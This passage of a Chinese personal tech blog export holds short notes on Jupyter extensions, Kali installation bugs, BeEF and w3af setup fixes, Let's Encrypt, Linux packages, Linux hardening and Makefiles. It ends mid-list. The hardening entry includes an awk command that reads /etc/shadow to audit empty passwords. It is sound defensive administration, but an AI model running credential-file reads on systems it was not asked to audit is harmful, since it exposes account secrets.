re></td></tr></table></figure>

<p>要将任意的JavaScript代码编码为JSFuck风格，可前往<a href="http://www.jsfuck.com/">JSFuck</a>。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>Jupyter Notebook 常用扩展</title>
    <url>/2018/09/25/jupyter-notebook-extensions/</url>
    <content><![CDATA[<h2 id="扩展机制"><a href="#扩展机制" class="headerlink" title="扩展机制"></a>扩展机制</h2><p>在介绍常用扩展之前，有必要先来介绍一下 Jupyter Notebook 的扩展机制：本质上来说，所有的 Jupyter Notebook 扩展都是一个个的 Python 包，所以大部分可以通过 <code>pip</code> 快速安装，另外，Jupyter Notebook 是一个典型的 <strong>B/S</strong> 架构的应用，用户通过访问浏览器来使用 Jupyter Notebook，因此，Jupyter Notebook 的扩展可以只针对服务器端，也可以针对前端资源页面，而如果一个扩展增强了 Jupyter Notebook 的前端资源页面，则它还必须使用如下命令安装资源：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">jupyter nbextension install helpful_package --py <span class="comment"># or --sys-prefix if using virtualenv or conda</span></span><br></pre></td></tr></table></figure>

<p>安装完资源后，如果这个资源需要在每次 Jupyter Notebook 启动后被加载，则还应使用如下命令启用资源：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">jupyter nbextension <span class="built_in">enable</span> helpful_package --py <span class="comment"># or --sys-prefix if using virtualenv or conda</span></span><br></pre></td></tr></table></figure>

<h2 id="jupyter-contrib-nbextensions"><a href="#jupyter-contrib-nbextensions" class="headerlink" title="jupyter_contrib_nbextensions"></a><a href="https://github.com/ipython-contrib/jupyter_contrib_nbextensions">jupyter_contrib_nbextensions</a></h2><p>与其说这是一个扩展，倒不如说这是<strong>一群</strong>扩展，该扩展集合了大多数的 Jupyter Notebook 常用扩展。</p>
<p>使用 <code>pip install jupyter_contrib_nbextensions</code> 命令即可安装，安装完成后使用 <code>jupyter contrib nbextension install --user</code> 命令进行些许配置，参数 <code>--user</code> 指定安装到当前用户家目录下的 <code>.jupyter</code> 文件夹下。</p>
<p>等到安装并配置完成后，打开 Jupyter Notebook 网页，会出现 <code>Nbextensions</code> 选项卡，点击进入此选项卡中，可以启用或禁用相应的扩展。</p>
<h2 id="RISE"><a href="#RISE" class="headerlink" title="RISE"></a><a href="https://github.com/damianavila/RISE">RISE</a></h2><p>该扩展可以将 Jupyter Notebook 中的一个个单元格转换为一张张的幻灯片。</p>
<p>使用 <code>pip install RISE</code> 命令即可安装，安装完成后使用 <code>jupyter-nbextension install rise --py --sys-prefix</code> 命令安装前端资源，接着使用 <code>jupyter-nbextension enable rise --py --sys-prefix</code> 命令启用前端资源。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>Kali Rolling 2017 中无法登录 BeEF 的解决方案</title>
    <url>/2018/02/08/kali-beef-bug/</url>
    <content><![CDATA[<p>在 Kali Rolling 2017 中打开 BeEF 然后自动跳转到登录页面，会发现只有 BeEF 的图标而没有登录框，无法进行登录，经查是因为和 Metasploit 的集成有关的，解决方案如下：</p>
<p>将 <code>/usr/share/beef-xss/extensions/admin_ui/api/handler.rb</code> 文件中第 22 行的</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">minified = Uglifier.compile(evaluated)</span><br></pre></td></tr></table></figure>

<p>改为</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">minified = evaluated</span><br></pre></td></tr></table></figure>

<p>保存并重启 BeEF 即可。</p>
]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali 持久加密 USB 安装所遇问题总结</title>
    <url>/2017/12/04/kali-live-usb-bug/</url>
    <content><![CDATA[<h2 id="Writing-superblocks-and-filesystem-accounting-information"><a href="#Writing-superblocks-and-filesystem-accounting-information" class="headerlink" title="Writing superblocks and filesystem accounting information"></a>Writing superblocks and filesystem accounting information</h2><p>今天在将 Kali 安装到 U 盘上时遇到了上面所示的问题，也可以翻译成“写入超级块和文件系统账户统计信息”，具体情况是当使用 <code>mkfs.ext4</code> 格式化加密分区时，程序运行到上面所示的地方停止不动，无论等多久都无法完成，其间还会发生 U 盘挂掉又重连上的情况，使用 <code>dmesg</code> 命令诊断故障时发现如下错误：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">device descriptor read/8, error -110</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>经判断是因为主板无法提供给 U 盘足够的电量所导致的，因为我的 U 盘和虚拟机之间是 3.0 连接的，3.0 连接要比 2.0 连接耗电，所以将 U 盘和虚拟机之间的连接改为 2.0 即可解决这个问题。</p>
<h2 id="时间问题"><a href="#时间问题" class="headerlink" title="时间问题"></a>时间问题</h2><p>安装好 Kali 并启动之后，会发现 Kali 的系统时间始终无法和 Windows 的系统时间保持一致，具体表现如下：</p>
<p>开始时，Windows 系统时间准确，启动 Kali 之后，Kali 系统时间错误，将其更新正确之后，关闭 Kali，进入 Windows，发现 Windows 系统时间又错误。</p>
<p>出现这种情况的原因是 Windows 和 Linux 的时间机制不一样，具体而言，Windows 的时间就是硬件 BIOS 的时间，而 Linux 的时间则是硬件 BIOS 加上所在时区的时间。解决方法是，在 Kali 中执行如下命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo timedatectl set-local-rtc 1 --adjust-system-clock</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Rolling 2017 更新后无法启动解决方案</title>
    <url>/2017/11/25/kali-update-bug/</url>
    <content><![CDATA[<h2 id="BusyBox-v1-27-2-Debian-1-1-27-2-1-built-in-shell-ash"><a href="#BusyBox-v1-27-2-Debian-1-1-27-2-1-built-in-shell-ash" class="headerlink" title="BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)"></a>BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)</h2><p>有时更新 Kali 后重新启动会出现如下显示，并无法进入系统界面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)</span><br><span class="line">Enter &#x27;help&#x27; for a list of built-in commands.</span><br><span class="line"></span><br><span class="line">(initramfs)</span><br></pre></td></tr></table></figure>

<p><strong>解决方法：</strong></p>
<ol>
<li>在此界面输入 <code>blkid</code> 命令，查看自己的分区号</li>
<li>依据自己的分区号输入 <code>fsck -y /dev/sda1</code>，我的分区号是 <code>sda1</code>。</li>
<li>输入 <code>exit</code> 命令退出重启电脑</li>
</ol>
]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Rolling 2017 下安装 w3af 出错解决方案</title>
    <url>/2017/11/08/kali-w3af-bug/</url>
    <content><![CDATA[<h2 id="Run-error-quot-39-module-39-object-has-no-attribute-39-SSL-ST-INIT-39-quot-quot"><a href="#Run-error-quot-39-module-39-object-has-no-attribute-39-SSL-ST-INIT-39-quot-quot" class="headerlink" title="Run error: &quot;&#39;module&#39; object has no attribute &#39;SSL_ST_INIT&#39;&quot;.&quot;"></a>Run error: &quot;&#39;module&#39; object has no attribute &#39;SSL_ST_INIT&#39;&quot;.&quot;</h2><p><strong>解决方法 1：</strong></p>
<p>修改 <code>/usr/local/lib/python2.7/dist-packages/OpenSSL/SSL.py</code> 文件，将下面四行注释掉</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SSL_ST_INIT = _lib.SSL_ST_INIT</span></span><br><span class="line"><span class="comment"># SSL_ST_BEFORE = _lib.SSL_ST_BEFORE</span></span><br><span class="line"><span class="comment"># SSL_ST_OK = _lib.SSL_ST_OK</span></span><br><span class="line"><span class="comment"># SSL_ST_RENEGOTIATE = _lib.SSL_ST_RENEGOTIATE</span></span><br></pre></td></tr></table></figure>

<p><strong>解决方法 2：</strong></p>
<ol>
<li><p>卸载 w3af 要求的 pyOpenSSL 版本</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip uninstall pyOpenSSL</span><br></pre></td></tr></table></figure></li>
<li><p>安装最新版 pyOpenSSL</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip install pyOpenSSL</span><br></pre></td></tr></table></figure></li>
<li><p>编辑 w3af 安装目录中的 <code>/w3af/core/controllers/dependency_check/requirements.py</code> 文件，将要求的 pyOpenSSl 版本号改为你安装的最新版，即修改下面这一行代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PIPDependency(<span class="string">&#x27;OpenSSL&#x27;</span>, <span class="string">&#x27;pyOpenSSL&#x27;</span>, <span class="string">&#x27;Version of pyOpenSSL you are using&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<span id="more"></span>

<h2 id="error-command-39-x86-64-linux-gnu-g-39-failed-with-exit-status-1"><a href="#error-command-39-x86-64-linux-gnu-g-39-failed-with-exit-status-1" class="headerlink" title="error: command &#39;x86_64-linux-gnu-g++&#39; failed with exit status 1"></a>error: command &#39;x86_64-linux-gnu-g++&#39; failed with exit status 1</h2><p><strong>解决方法：</strong></p>
<p>使用如下命令安装相关依赖</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get build-dep python-lxml</span><br><span class="line">apt-get install libxslt-dev libssl-dev</span><br></pre></td></tr></table></figure>

<h2 id="ImportError-No-module-named-webkit"><a href="#ImportError-No-module-named-webkit" class="headerlink" title="ImportError: No module named webkit"></a>ImportError: No module named webkit</h2><p>启动 GUI 界面时可能会报此错误，原因是未安装相关模块</p>
<p><strong>解决方法：</strong></p>
<p>执行如下命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get install python-webkit python-webkit-dev</span><br></pre></td></tr></table></figure>

<p>在 Kali 下，因为 python-webkit、python-webkit-dev 不在 Kali 默认的源中，所以需要执行下面的命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget http://ftp.cn.debian.org/debian/pool/main/p/python-support/python-support_1.0.15_all.deb</span><br><span class="line">dpkg -i python-support_1.0.15_all.deb</span><br><span class="line">wget http://ftp.cn.debian.org/debian/pool/main/p/pywebkitgtk/python-webkit_1.1.8-3_amd64.deb</span><br><span class="line">dpkg -i python-webkit_1.1.8-3_amd64.deb</span><br><span class="line">apt install python-gtk2-dev</span><br><span class="line">wget http://ftp.cn.debian.org/debian/pool/main/p/pywebkitgtk/python-webkit-dev_1.1.8-3_all.deb</span><br><span class="line">dpkg -i python-webkit-dev_1.1.8-3_all.deb</span><br></pre></td></tr></table></figure>

<p>安装过程中可能需要安装相关依赖，可执行如下命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt --fix-broken install</span><br></pre></td></tr></table></figure>

<h2 id="ImportError-No-module-named-gtksourceview2"><a href="#ImportError-No-module-named-gtksourceview2" class="headerlink" title="ImportError: No module named gtksourceview2"></a>ImportError: No module named gtksourceview2</h2><p>同样，启动 GUI 时也可能报此错误</p>
<p><strong>解决方法：</strong></p>
<p>执行如下命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get install python-gtksourceview2</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>LaTeX小记</title>
    <url>/2018/09/12/latex/</url>
    <content><![CDATA[<h2 id="TeX与LaTeX"><a href="#TeX与LaTeX" class="headerlink" title="TeX与LaTeX"></a>TeX与LaTeX</h2><p><a href="https://www.tug.org/begin.html">TeX</a>是由<a href="https://zh.wikipedia.org/zh-cn/%E9%AB%98%E5%BE%B7%E7%BA%B3">Donald Knuth</a>开发的一个排版系统，特别适合处理复杂的数学公式等。之后，<a href="https://zh.wikipedia.org/zh-cn/%E8%8E%B1%E6%96%AF%E5%88%A9%C2%B7%E5%85%B0%E6%B3%A2%E7%89%B9">Leslie Lamport</a>改进了TeX，形成了<a href="https://www.latex-project.org/">LaTeX</a>(Lamport TeX)。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p><a href="https://www.mathjax.org/">MathJax</a>是一个JavaScript引擎，可以用来在网页上显示使用LaTeX语言书写的数学公式。<br><a href="https://www.codecogs.com/latex/eqneditor.php?lang=zh-cn">在线LaTeX公式编辑器</a>是一个将公式符号转化为LaTeX语言的网站，对于尚不熟悉的人书写LaTeX公式提供一点便利。<br><a href="https://cn.sharelatex.com/">ShareLaTeX</a>是一个在线的LaTeX编辑环境，同时也提供了足够多的LaTeX模板。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>使用Let&#39;s Encrypt获取免费SSL证书</title>
    <url>/2018/09/16/let-s-encrypt/</url>
    <content><![CDATA[<p><a href="https://letsencrypt.org/zh-cn/">Let&#39;s Encrypt</a>是一个免费、自动化和开放的证书颁发机构，它提供了一个工具：<a href="https://certbot.eff.org/">Certbot</a>，可以用来获取SSL证书。<br>进入Certbot的官网，根据自己的环境选择Web服务器和操作系统，即可得到详细的操作步骤，下面以Nginx Web服务器和CentOS 6操作系统为例，给出相关步骤：</p>
<span id="more"></span>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载certbot-auto脚本</span></span><br><span class="line">wget https://dl.eff.org/certbot-auto</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置相关权限</span></span><br><span class="line">chmod a+x certbot-auto</span><br></pre></td></tr></table></figure>

<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>请注意，获取或更新SSL证书之前需关闭相应的Web服务器，具体而言，需要执行<code>service nginx stop</code>。另外，第一次执行<code>certbot-auto</code>命令时，它会下载并安装相关环境，耐心等待即可。<br>Certbot提供了一个Nginx插件，直接使用<code>./certbot-auto --nginx</code>即可完成所有配置。<br>如果你想手动配置，可执行<code>./certbot-auto certonly --standalone</code>命令，此命令运行过程中会要求用户输入要获取SSl证书的域名，按要求输入即可，命令运行成功后会显示证书相关文件所在的目录。<br>接下来只需在Nginx的配置文件<code>nginx.conf</code>中进行如下配置即可(以howiezhao.com域名为例)：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssl on;</span><br><span class="line">ssl_certificate /etc/letsencrypt/live/howiezhao.com/fullchain.pem;</span><br><span class="line">ssl_certificate_key /etc/letsencrypt/live/howiezhao.com/privkey.pem;</span><br></pre></td></tr></table></figure>

<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>Let&#39;s Encrypt的证书默认时间为90天，当到期后，需要使用<code>./certbot-auto renew</code>命令进行证书更新。</p>
<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>要查看<code>certbot-auto</code>的更多命令，可以使用<code>certbot-auto --help all</code>命令查看之。要了解SSL的详细知识，可参考我之前写的笔记<a href="http://localhost:4000/2018/05/11/https/">HTTPS运行机制</a>。要了解Nginx的相关知识，可参考我之前写的笔记<a href="todo">利用Nginx进行反向代理</a>。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>库与框架</title>
    <url>/2018/09/16/library-framework/</url>
    <content><![CDATA[<p>软件开发中经常会有人混淆库与框架的含义，下面简单介绍之：</p>
<p><strong>库</strong>（library）是一个工具集，它不告诉你应该怎么做事，它只告诉你它能干什么事，具体干什么事，取决于使用者，比如，<a href="https://jquery.com/">jQuery</a>、Servlet 等是一个个的库。</p>
<p>库的优点是自由度高，可定制性强，较适用于小项目。</p>
<p><strong>框架</strong>（framework）制定了一系列的规则，限定了你的行动，你必须遵循它制定的规则行事，但它却可以极大方便你的开发，比如，<a href="https://angular.io/">Angular</a>、<a href="https://spring.io/">Spring</a> 等是一个个的框架。</p>
<p>框架的优点是流程性高，便于开发，较适用于大项目。</p>
<p>通常，我们把库也称为<strong>类库</strong>（class library），这也从另一个方面反映了库中包含的主要是<strong>类</strong>，类似的，框架中也主要包含类，据此，我们可以把程序员分为<strong>类创建者</strong>和<strong>客户端程序员</strong>，客户端程序员通过调用其类来使用库或框架。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>Linux 的包管理机制</title>
    <url>/2018/05/09/linux-package/</url>
    <content><![CDATA[<p>不同 Linux 发行版的主要区别是其包管理机制不同，Linux 发行版大致可以分为 2 个派别：一派以 Red Hat 为首，主要包括 CentOS（社区版）、Fedora（桌面版）等；另一派以 Debian 为首，主要包括 Ubuntu、Kali 等。Red Hat 系采用 <code>rpm</code> 为其包格式，<code>yum</code> 为其包管理工具；Debian 系采用 <code>dpkg</code> 为其包格式，<code>apt-get</code> 为其包管理工具。</p>
<h2 id="rpm-与-yum"><a href="#rpm-与-yum" class="headerlink" title="rpm 与 yum"></a>rpm 与 yum</h2><p><code>rpm</code> 全称 Red-Hat Package Manager（RPM 软件包管理器），是 Red Hat 系中的包格式，同时也是其<strong>本地</strong>包管理工具，常用命令有：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">rpm -i a.rpm  <span class="comment"># 安装a</span></span><br><span class="line">rpm -e a      <span class="comment"># 卸载a</span></span><br></pre></td></tr></table></figure>

<p><code>yum</code> 全称 Yellow dog Updater, Modified（修改后的黄色狗更新器），是 Red Hat 系中的包管理工具，常用命令有：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yum update     <span class="comment"># 更新包列表</span></span><br><span class="line">yum upgrade    <span class="comment"># 更新包</span></span><br><span class="line">yum install a  <span class="comment"># 安装a</span></span><br><span class="line">yum remove a   <span class="comment"># 卸载a</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h2 id="dpkg-与-apt-get"><a href="#dpkg-与-apt-get" class="headerlink" title="dpkg 与 apt-get"></a>dpkg 与 apt-get</h2><p><code>dpkg</code> 全称 Debian Packager（Debian 包工具），是 Debian 系中的包格式，同时也是其<strong>本地</strong>包管理工具，常用命令有：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">dpkg -i a.dpkg  <span class="comment"># 安装a</span></span><br><span class="line">dpkg -r a       <span class="comment"># 卸载a</span></span><br></pre></td></tr></table></figure>

<p><code>apt-get</code> 是 apt 中的一个子程序，apt 全称 Advanced Packaging Tool（先进的包工具），是 Debian 系中的包管理工具，apt 的程序包来源列表文件位于 <code>/etc/apt/sources.list</code>，<code>apt-get</code> 的常用命令有：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get update     <span class="comment"># 更新包列表</span></span><br><span class="line">sudo apt-get upgrade    <span class="comment"># 更新包</span></span><br><span class="line">sudo apt-get install a  <span class="comment"># 安装a</span></span><br><span class="line">sudo apt-get purge a    <span class="comment"># 卸载a并删除其配置文件（即彻底删除），命令作用等同于apt-get --purge remove a</span></span><br></pre></td></tr></table></figure>

<p>同样的，<code>apt-cache</code> 也是 apt 中的一个子程序，它的常用命令有：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-cache depends a  <span class="comment"># 查看包a的依赖包</span></span><br></pre></td></tr></table></figure>

<p>值得注意的是，随着新版系统的到来，出现了更为强大的 <code>apt</code> 命令，可以简单认为 <code>apt</code> 集合了 <code>apt-get</code>、<code>apt-cache</code>、<code>apt-config</code> 中的最常用命令选项。例如，<code>apt install</code> 相比 <code>apt-get install</code> 增加了色彩显示以及进度条显示等功能。因此，更建议使用 <code>apt</code> 命令，常用命令有：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt update     <span class="comment"># 更新包列表</span></span><br><span class="line">sudo apt upgrade    <span class="comment"># 更新包</span></span><br><span class="line">sudo apt install a  <span class="comment"># 安装a</span></span><br><span class="line">sudo apt purge a    <span class="comment"># 卸载a并删除其配置文件（即彻底删除），命令作用等同于apt --purge remove a</span></span><br><span class="line">sudo apt list --installed  <span class="comment"># 查看已安装的包</span></span><br></pre></td></tr></table></figure>

<p>关于 Ubuntu 中程序包的搜索可以使用 <a href="https://packages.ubuntu.com/">Ubuntu Packages Search</a>。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux系统加固</title>
    <url>/2018/05/19/linux-reinforcement/</url>
    <content><![CDATA[<h2 id="帐户与口令"><a href="#帐户与口令" class="headerlink" title="帐户与口令"></a>帐户与口令</h2><p>此方面的加固主要为了防止针对帐户的暴力破解。</p>
<p>禁用或删除无用帐户：<br>使用命令<code>userdel &lt;用户名&gt;</code>删除不必要的帐户，使用参数<code>-r</code>即可删除相应用户的家目录和邮箱目录。<br>使用命令<code>passwd -l &lt;用户名&gt;</code>锁定不必要的帐户，解锁可使用<code>passwd -u &lt;用户名&gt;</code>。</p>
<p>检查特殊帐户：<br>使用命令<code>awk -F: &#39;($2==&quot;&quot;)&#39; /etc/shadow</code>查看空口令帐户，若存在，则使用命令<code>passwd &lt;用户名&gt;</code>为空口令帐户设定密码。<br>使用命令<code>awk -F: &#39;($3==0)&#39; /etc/passwd</code>查看uid为0的帐户，确认uid为0的帐户只有root帐户。</p>
<p>添加口令策略：<br>使用命令<code>change -m 0 -M 30 -E 2020-01-01 -W 7 &lt;用户名&gt;</code>修改帐户口令策略，<code>-m</code>表示密码最小使用天数，<code>-M</code>表示密码最大使用天数，<code>-E</code>表示密码到期时间，<code>-W</code>表示密码到期前多少天提醒。或者可以直接编辑/etc/login.defs文件进行修改。</p>
<span id="more"></span>
<p>设置用户锁定：<br>在CentOS7中，编辑/etc/pam.d/system-auth文件，添加<code>auth required pam_tally2.so onerr=fail deny=6 unlock_time=300</code>此行，表示当密码连续输错6次后锁定，锁定时间300秒。<br>限制能su到root的用户：<br>编辑/etc/pam.d/su文件，添加<code>auth required pam_wheel.so group=test</code>此行，表示只允许test组用户su到root。</p>
<h2 id="服务安全"><a href="#服务安全" class="headerlink" title="服务安全"></a>服务安全</h2><p>服务越少，系统越安全。</p>
<p>关闭不必要的服务：<br>在CentOS中，使用命令<code>chkconfig --level &lt;init级别&gt; &lt;服务名&gt; on|off|reset</code>设置服务在指定init级别下开机是否启动。</p>
<p>SSH服务安全：<br>编辑/etc/ssh/sshd_config文件，修改默认端口，即<code>Port</code>项；禁止root用户远程登录，即<code>PermitRootLogin</code>项，应使用普通用户登录，特殊权限时使用<code>sudo</code>命令；禁止空密码登录，即<code>PermitEmptyPasswords</code>项；限制登录密码输错次数；最好使用密钥登录而不是密码登录，即<code>PasswordAuthentication</code>项值改为<code>no</code>。修改完后，需要使用<code>service sshd restart</code>重启SSH服务。</p>
<h2 id="文件系统安全"><a href="#文件系统安全" class="headerlink" title="文件系统安全"></a>文件系统安全</h2><p>权限越小，系统越安全</p>
<p>设置umask值：<br>编辑/etc/profile文件，修改umask值为027。</p>
<p>设置登录超时：<br>编辑/etc/profile文件，添加<code>TIMEOUT=180</code>，即登录后无操作3分钟将超时断开连接。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Makefile 小记</title>
    <url>/2019/04/18/makefile/</url>
    <content><![CDATA[<p>Linux 中使用最广的构建工具是 <strong>make</strong>，而 make 会读取 <strong>Makefile</strong> 文件中的配置信息来完成构建，一个简单的 Makefile 文件如下所示：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">editor : main.o text.o</span><br><span class="line">    gcc -o editor main.o text.o</span><br><span class="line">main.o : main.c def.h</span><br><span class="line">    gcc -c main.c  <span class="comment">#-c参数指定生成.o文件</span></span><br><span class="line">text.o : text.c com.h</span><br><span class="line">    gcc -c text.c</span><br><span class="line">install : editor</span><br><span class="line">    mv editor /usr/local</span><br></pre></td></tr></table></figure>

<p>具体而言，冒号前面为 <strong>target</strong>，即要生成的文件；冒号后面为 <strong>dependencies</strong>，即被依赖的文件；每一个 <strong>target:dependencies 对</strong>的下一行为要执行的<strong>命令</strong>（注意要以 Tab 键起首）。当 make 不带参数时，默认执行第一个 target。target 也可以是要求 make 要完成的动作，执行这种 target 后并不能得到和 target 同名的文件，因此，也称做 <strong>phony target</strong>（即伪 target），如第 7 行所示。dependencies 也可以为空，如常用的 target 为 <code>clean</code> 时，就没有依赖，只有命令，一般用于清理工作。</p>
<p>当输入 <code>make</code> 或 <code>make editor</code>，即可开始构建。若 <code>editor</code> 这个 target 文件不存在，或者 <code>main.o</code>、<code>text.o</code> 这两个依赖文件被修改，都会导致 make 调用其下的命令 <code>gcc -o editor main.o text.o</code>；接下来，由于引用到 <code>main.o</code> 和 <code>text.o</code>，make 会检查 <code>main.o</code> 的依赖 <code>main.c</code>、<code>def.h</code> 有无更新，如果有，则执行其下的命令 <code>gcc -c main.c</code>；同理，也适用于 <code>text.o</code>。当输入 <code>make install</code>，make 会检查 <code>install</code> 的依赖 <code>editor</code> 是否是最新，如果是，则执行其下的命令 <code>mv editor /usr/local</code>。</p>
<span id="more"></span>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>Makefile 中以 <code>#</code> 开头的均为注释。</p>
<h2 id="回声"><a href="#回声" class="headerlink" title="回声"></a>回声</h2><p>正常情况下，make 会打印每条命令，然后再执行，这就叫做<strong>回声</strong>。在命令的前面加上 <code>@</code>，就可以关闭回声。由于在构建过程中，需要了解当前在执行哪条命令，所以通常只在注释和纯显示的 <code>echo</code> 命令前面加上 <code>@</code>。</p>
<h2 id="内置目标名"><a href="#内置目标名" class="headerlink" title="内置目标名"></a>内置目标名</h2><p><strong>内置目标名</strong>指示了如果某些名称作为 target（目标名）出现，则具有特殊含义，常用的如下所示：</p>
<ul>
<li><code>.PHONY</code>：明确声明伪目标</li>
<li><code>.SUFFIXES</code>：消除默认后缀规则</li>
<li><code>.DELETE_ON_ERROR</code>：如果遇到错误（或 make 中断）则删除目标文件</li>
</ul>
<p>更多的内置目标名可以参考 <a href="https://www.gnu.org/software/make/manual/html_node/Special-Targets.html#Special-Targets">make 官方手册</a>。</p>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>Makefile 中也可以使用变量，如下所示：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">TXT = Hello World</span><br><span class="line"><span class="section">test:</span></span><br><span class="line">    echo <span class="variable">$(TXT)</span></span><br></pre></td></tr></table></figure>

<p>这类似于 C 语言中的宏，按照传统，变量名一般大写，使用变量时要放在 <code>$()</code> 之中。</p>
<p>有时，变量的值可能指向另一个变量，比如：<code>V1 = $(V2)</code>，这时会出现一个问题，<code>V1</code> 的值到底在定义时扩展（静态扩展），还是在运行时扩展（动态扩展）？如果 <code>V2</code> 的值是动态变化的，这两种扩展方式的结果可能会差异很大。为了解决类似问题，Makefile 一共提供了四个赋值运算符，如下所示：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在运行时扩展，允许递归扩展。</span></span><br><span class="line">VARIABLE = value</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在定义时扩展。</span></span><br><span class="line">VARIABLE := value</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只有在该变量为空时才设置值。</span></span><br><span class="line">VARIABLE ?= value</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将值追加到变量的尾端。</span></span><br><span class="line">VARIABLE += value</span><br></pre></td></tr></table></figure>

<h2 id="内置变量"><a href="#内置变量" class="headerlink" title="内置变量"></a>内置变量</h2><p>Makefile 提供了一系列的内置变量，常见的如下所示：</p>
<ul>
<li><code>$(CC)</code>：指向当前使用的编译器</li>
</ul>
<p>更多的内置变量可以参考 <a href="https://www.gnu.org/software/make/manual/html_node/Implicit-Variables.html">make 官方手册</a>。</p>
<h2 id="自动变量"><a href="#自动变量" class="headerlink" title="自动变量"></a>自动变量</h2><h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h2><p>使用条件判断，可以让 make 根据运行时的不同情况选择不同的执行分支。如下所示：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(CC)</span>,gcc)</span><br><span class="line">  libs=<span class="variable">$(libs_for_gcc)</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  libs=<span class="variable">$(normal_libs)</span></span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure>

<p>上面代码判断当前编译器是否为 gcc，然后指定不同的库文件。其中 <code>ifeq</code> 比较参数 <code>arg1</code> 和 <code>arg2</code> 是否相同，类似的，<code>ifneq</code> 比较参数 <code>arg1</code> 和 <code>arg2</code> 是否不相同。</p>
<p>除此之外，还有 <code>ifdef</code> 判断变量是否被定义，<code>ifndef</code> 判断变量是否没有被定义。</p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>Makefile 中还内置了许多函数，可供调用，格式如下：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="variable">$(function arguments)</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$&#123;function arguments&#125;</span><br></pre></td></tr></table></figure>

<p>常用的函数有：</p>
<ul>
<li><code>$(shell)</code>：用来执行 shell 命令</li>
<li><code>$(wildcard)</code>：用来在 Makefile 中，替换 Bash 的通配符。</li>
